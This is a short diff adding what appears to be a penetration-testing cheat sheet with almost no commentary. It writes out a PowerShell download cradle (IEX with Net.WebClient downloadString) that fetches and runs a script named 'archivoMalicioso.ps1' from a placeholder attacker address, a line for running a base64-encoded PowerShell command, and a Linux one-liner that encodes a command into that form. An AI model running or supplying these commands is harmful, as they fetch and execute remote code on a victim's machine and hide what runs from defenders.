@@ -1,0 +1,7 @@
+
+
+::: IEX(New-Object Net.WebClient).downloadString('http://miIpHere/archivoMalicioso.ps1')
+
+::: cmd /c powershell -encodedcommand
+	
+	'linux:: echo -n "ping -n 4 myIpHere" | iconv -t utf-16le | base64'
